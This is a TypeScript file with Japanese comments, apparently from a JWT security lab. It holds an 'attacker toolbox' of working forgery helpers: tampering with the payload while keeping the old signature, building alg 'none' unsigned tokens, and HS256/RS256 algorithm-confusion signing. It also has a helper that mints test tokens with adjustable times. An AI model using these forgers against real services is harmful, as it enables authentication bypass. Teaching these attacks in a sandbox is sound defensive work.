// 攻撃者の道具箱と、実験用のトークン発行ヘルパー（後者は練習問題 3 で追加する関数）。
// ここで作るトークンは、同梱サンドボックスの中の自分のコードに対してだけ使います。
import type { JWTPayload } from "jose";
import { SignJWT, generateKeyPair } from "jose";

function toBase64Url(value: unknown): string {
  return Buffer.from(JSON.stringify(value), "utf8").toString("base64url");
}

/** 署名部分はそのまま流用し、ペイロードだけ書き換える（改ざん） */
export function tamperPayload(token: string, patch: Record<string, unknown>): string {
  const [head, body, sign] = token.split(".");
  if (head === undefined || body === undefined || sign === undefined) {
    throw new Error("JWS 形式（3 部構成）ではありません");
  }
  const payload = JSON.parse(Buffer.from(body, "base64url").toString("utf8")) as Record<
    string,
    unknown
  >;
  return `${head}.${toBase64Url({ ...payload, ...patch })}.${sign}`;
}

/** alg を none にし署名を空にしたトークンを組み立てる（鍵が要らない） */
export function forgeNoneToken(claims: JWTPayload): string {
  return `${toBase64Url({ alg: "none", typ: "JWT" })}.${toBase64Url(claims)}.`;
}

/** 誰でも取れる公開鍵の文字列を HMAC の共通鍵に見立てて署名する（アルゴリズム混同） */
export async function forgeHs256Token(
  claims: JWTPayload,
  keyMaterial: string,
  kid: string,
): Promise<string> {
  return await new SignJWT(claims)
    .setProtectedHeader({ alg: "HS256", kid })
    .sign(new TextEncoder().encode(keyMaterial));
}

/** 実験用に、その場で鍵ペアを作ってトークンを発行する（時刻の条件を自由に指定できる） */
export async function mintTokenWithOwnKey(options: {
  issuer: string;
  audience: string;
  subject?: string;
  jti?: string;
  /** iat を基準時刻から何秒ずらすか（負の値で過去にする） */
  issuedAtOffsetSec?: number;
  /** iat から何秒後を exp にするか */
  expiresInSec?: number;
  /** nbf を基準時刻から何秒ずらすか（未指定なら nbf を入れない） */
  notBeforeOffsetSec?: number;
}) {
  const { publicKey, privateKey } = await generateKeyPair("RS256");
  const baseTimeSec = Math.floor(Date.now() / 1000);
  const issuedAt = baseTimeSec + (options.issuedAtOffsetSec ?? 0);

  const signer = new SignJWT({ jti: options.jti ?? "lab-0001" })
    .setProtectedHeader({ alg: "RS256", kid: "lab-key-1" })
    .setIssuer(options.issuer)
    .setSubject(options.subject ?? "lab-user")
    .setAudience(options.audience)
    .setIssuedAt(issuedAt)
    .setExpirationTime(issuedAt + (options.expiresInSec ?? 300));
  if (options.notBeforeOffsetSec !== undefined) {
    signer.setNotBefore(baseTimeSec + options.notBeforeOffsetSec);
  }

  return { token: await signer.sign(privateKey), publicKey, baseTimeSec };
}
